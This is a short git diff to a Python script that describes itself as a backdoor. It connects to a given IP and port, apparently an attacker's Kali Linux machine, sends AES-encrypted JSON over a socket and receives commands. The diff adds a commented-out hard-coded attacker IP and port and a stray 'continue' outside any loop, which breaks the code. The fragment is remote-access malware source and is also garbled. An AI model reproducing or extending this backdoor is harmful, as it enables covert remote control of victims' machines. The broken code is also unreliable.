@@ -10,6 +10,11 @@ import base64
 
 from Crypto.Cipher import AES
 
+
+# Step 1: Use explicite SERVER_IP and SERVER_PORT make create a connection 
+# SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
+# SERVER_PORT = 8888
+
 # Step 3: Configuration
 parser = argparse.ArgumentParser(description='Backdoor script to connect to given IP and port.')
 parser.add_argument('ip', help='IP address to connect to')
@@ -47,6 +52,7 @@ def send_encrypted(data):
     json_data = json.dumps(message)
     client_sock.send(json_data.encode('utf-8'))
 
+       continue
 
 def recv_command():
     data = client_sock.recv(4096).decode('utf-8')  # Increased buffer size for safety
